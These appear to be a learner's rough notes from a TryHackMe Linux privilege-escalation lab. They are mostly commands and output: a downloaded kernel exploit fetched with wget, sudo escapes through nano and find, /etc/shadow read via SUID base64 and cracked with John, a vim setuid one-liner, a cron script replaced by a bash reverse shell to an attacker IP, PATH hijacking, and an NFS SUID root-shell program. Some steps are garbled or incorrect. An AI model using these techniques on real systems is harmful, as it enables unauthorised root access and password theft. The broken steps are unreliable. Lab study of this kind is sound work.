usuing kernel exploit :

here we already got shell access given by THM hence we are tyring to escalte the things:

serach kernel version in target machine :
uname- a

with hte kernel version we can download the exploit and confirm with the CVE as a question from THM

exploit db dont have program but only .txt file hence we used searchsplloit to download the .c or .py payload 


target machine                                                Attack machine 


searchsploit kernel 13.1

searchsploit -m path 

now the file is in our system just change it to /tmp folder 

now we need to transfer our file to target machine 

use python method :

python3 -m http.server 8000                                     go to temp folder 
                                                                cd /tmp
																pwd
																tmp
																wget http://10.10.12.31:8000/3792.c
																
																now the file is in tyarget system and how to run or pawn?
																cd /tmp 
																gcc gcc 37292.c -o pwned
																./pwned
																pass
																thats it booom!
																
															    cd /home
																matt
																cd matt
																flag1.txt
																cat flag1.txt
																thm-27736489404
																
																
																
																
																>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
:

I have added sudo permission to karen as we got root access by using this article 

https://www.liquidweb.com/kb/how-to-add-a-user-and-grant-root-privileges-on-ubuntu-16-04/

however I still couldnt able to find flag2 as this seems to be out of range for karen account 

however I also see from /etc/passwd karen , matt and puk has root accesscat cat

___________________________________________________________________________________________________

privelege escaaltion sudo :

now we need to get sudo permissions to karen
however by using sudo we can get root access but we cant able to read all the files hence to leverage we use below technique

if we do sudo -l we can the permissions user has 

if we have env_keep += LD_preload enabled then we can get root access

LD_PRELOAD is a function that allows any program to use shared libraries. 
This blog post will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled
 we can generate a shared library which will be loaded and executed before the program is run.
 Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.
 
 Steps:
 
 enable env_keep += - LD_preload for that 
 
 write a simpel c code 
  run the program with sudo rights and point to .so file 
  
  however due to syntax issue I cpoulnt able to write the code 
  
  now we have another way :
  
  When we cd back to root via cd /, and we run the id command,

  we can see that we do not have root access, thus we will not be able to read Frank's password. Run cat /etc/shadow and you will see we cannot get access.
Linux PrivEsc

Let's fix that. Run sudo nano and press CTRL+R and CTRL+X. Enter the following command to gain root access: reset; bash 1>&0 2>&0 and press Enter.

try this command as welL ;sudo find . -exec /bin/sh \; -quit : if you have SUDO access but restricted to use for few progrsms ex: nano . vim 


you will get root accesss


pwd 
root

cat /etc/passwd

___________________________________________________________________________________________________

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>SUID:

file permissions are different from user to user ..One person can have all permissions and one person can have only specific permissions

SUID and SGID tells us what file permissions root user has ...with the help of below command 

find / -type f -perm -04000 -ls 2>/dev/null

when we type this from the output we have base64 file access which have vuln and we can crack that with the help of jon ripper rockyou.txt wordlist 

for that we need hash values of /etc/passwd.txt (Usernames) and /etc/shadow.txt (paswords in hash values) but due to file permission we cannot access these file hence use base 64 method with below command


base64 /etc/passwd | base64 -d

copy the output to your machine and name it passwd .txt 


now shadow.txt ...base64 /etc/shadow | base64 -d 

copy th output to your machine and nam eit shadow.txt 

now merge them both becasue the data in this both files will be mixed and kept in one document and that documents will be searhced by jon ripper worldlist to find the passwords

to merge : cat passwd.txt shadow.txt> mixed.txt

now use john ripper wordlist and compare our list :

john --wordlist=getrockyou.txt crackme.txt

booooooooooom !


here is the output :

root@ip-10-10-171-221:~# john --wordlist=/usr/share/wordlists/rockyou.txt mixed.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (karen)
Password1        (user2)
test123          (gerryconway)
3g 0:00:00:11 DONE (2022-12-14 23:45) 0.2652g/s 1561p/s 2195c/s 2195C/s paper..edwina
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

___________________________________________________________________________________________________

privelege access capabilities :

capabilities means if a user want to use a particular service which required root access then admin give access to that particular program or tool access only 

he cannot access any other root tools expect from that tool
inorder to do that he needs to set cap_setuid+ep

so in this task we will run a command called getcap -r / 2>/dev/null and see what programs run capsetid 

output : 

$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep .....using VIM editor 
/home/ubuntu/view = cap_setuid+ep...............using some other program called VIEW 


so we have vuln for vim capablities in gnhub and it suggests the below command  to get the access for root 

./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_/usr/sbin/suexec = cap_setgid,cap_setuid+ep


___________________________________________________________________________________________________



___________________________________________________________________________________________________


Cron jobs :

cron jobs are the tastks which are created with root access to run the scheduled tasks 

ex: run the alarms to test the server status 

soem times once they are done they will be left still in the crontab ..we can use that script to get the shell access as they have root permissions 


cd /home/admin/1/2/3/results
zip -r /home/admin/donwnload.zip ./*nano 


cat etc/crontab
we see there are 4 tabs running :


* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py

I decided to use test,py in /tmp folder 

when i opened that file I see no test.py which means someone used it but not deleted ....after the schedule is done it is still there in crontab with root permission but in the folder
hence I will use this because it already got root privelege

we need to write small script to make this run 

cat >test.py )we are creating because we dont have this file in /tmp folder 

#!/bin/bash
bash -i >& /dev/tcp/10.10.188.190(attack ip )/6666 0>&1

ctrl + d to save 

now we have to give persmissions to the file 

chmod 777 test.py 

also ie have to make iot root accessible )although it has permisssions given but we have created new one )

chown root:root test.py

now open other terminal an dlisten to port 6666

we will get no job done but if you press whoami we see root

booom !'

now flag 5 in cd/home/ubuntu 

and passwd follow previous process of wordlist with john rip 

youtube.com/watch?v=cRLDmWWyblQ&t=1817s

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

Privelege escaaltion PATH:

Using the path we can hijack and appliation from where we can get root access
path is nothing but the location of a file 

if that file permissions are included into that path we can utilise that path which has root permissions

lets say if we havenot defined any path for file with command then linux will search for its folder for path and permissions

so we are making that linux to search for that path with root permissions 

*make sure for any vectors the file permissions  should have write permissions then only we can edit that file or write our own script "



/home/murdoch
/etc/udev/rules.d/60-cdrom_id.rules
/var/lock
/var/tmp
/var/tmp/cloud-init
/var/crash

now if we open cd/ home/murdoch 

when we cd it .... we can test thm.py 

test is an application which we need to run in the below path 

as we discussed earlier we an execute any application if we add that application path to the below path 

first create an application with dummy code because it deosnt matter what we have in the code but it will try to execute using test application which will give us root access 

cat thm 

#!/bin/bash

sudo su - 

save 

now give executable permissions to thm 

chmod 777 thm

now add folder to PATH 

export PATH= /home/murdoch:$PATH

run the path  we created : ./test

we got root access
________________________________________________________________________________________


We can get direct root access if we can able to get SSH private key on the target system 

also we can use a misconfigured network shell to make the job done for us 

NFS network file sharing 0 configuaration is written in a way that can be read by users 

nfs files will be in etc/exports 

where we can see "no_root_squash" byy default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. 
If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

so here the task is that by transfering the nsf file to our machine we can get root access on our system itself

for that first we need to tranfer the mpunt files from target to our machine 

first we have to see which folder is accesssible for mount folders 

from our terminal do showmount -e 10.10.11.12

we can see /tmp folder is acessible 

 create a subfolder called test in /tmp folder 
 
 mkdir test
 
 
 in test copy the mnounted files 
 
 mount -0 rw 10.10.1.1.:/tmp  /tmp/test 
 
 now we have transferred this files to test in tmp folder 
 
 create a executable suid bit with below code and store in /tmp folder 
 
 now pawn that by using below comamnds 
 
 gcc nfs.c -o nfs -w
 
 and run ./nfs )this nfs will execute the program in the /tmp folder where we have nfs file shares as they alreay got root permission hence syustem think that this application is also running by root 
 
 so we will get root 
 
 
nfs
ssh-uohxGqQejJnr
systemd-private-85ffbf1f0dd74f058b1ac1b8fb447189-ModemManager.service-1jIDIz
systemd-private-85ffbf1f0dd74f058b1ac1b8fb447189-systemd-resolved.service-dDxioO
systemd-private-85ffbf1f0dd74f058b1ac1b8fb447189-systemd-timesyncd.service-lnqpXI
test
thmip.txt
root@ip-10-10-141-232:/tmp# mv nfs nfs.c
root@ip-10-10-141-232:/tmp# chmod 777 nfs.c
root@ip-10-10-141-232:/tmp# gcc nfs.c -o nfs -w
/tmp/cct3yE2X.o: In function `main':
nfs.c:(.text+0x1e): undefined reference to `setguid'
collect2: error: ld returned 1 exit status
root@ip-10-10-141-232:/tmp# gcc nfs.c -o nfs -w
root@ip-10-10-141-232:/tmp# ls -l nfs
-rwxr-xr-x 1 root root 8392 Dec 15 17:26 nfs
root@ip-10-10-141-232:/tmp# ./nfs
root@ip-10-10-141-232:/tmp# whoami
root


 
 grep -x “flag7.txt” *
 
 
Extra keys
Clipboard
Clipboard
int main()
{
    setgid(0);
	setuid(0);
	system("/bin/bash");
	return 0;
}



Linux ip-10-10-159-121 3.10.0-1160.el7.x86_64 

tried first vector no luck we got kernel vuln but issues with code couldnt abel to run 

sudo permission no for nano 


SUID ..yes we have base 64 

using that I have cracked the password for MIssy :Password1
missy have sudo permissions but restricted for usr/bin and nano ....so we cant use capabilities and ceonjobs .... base 64 

2 ways using base 64 file reading  and sudo permission we have fixed command 

1st way : 

[missy@ip-10-10-11-212 /]$ LFILE=/home/rootflag/flag2.txt
[missy@ip-10-10-11-212 /]$ base64 /homerootflag/flag2.txt | base64 --decode
base64: /homerootflag/flag2.txt: No such file or directory
[missy@ip-10-10-11-212 /]$ base64 /home/rootflag/flag2.txt | base64 --decode
THM-168824782390238

if we have sudo permissions then execute this command : ;sudo find . -exec /bin/sh \; -quit

whoami
root






missy@ip-10-10-11-212 home]$ LFILE= /home/rootflag/flag2.txt
bash: /home/rootflag/flag2.txt: Permission denied
[missy@ip-10-10-11-212 home]$ sudo base64 /home/rootflag/flag2.txt | base64 -d
[sudo] password for missy: 
Sorry, user missy is not allowed to execute '/bin/base64 /home/rootflag/flag2.tx

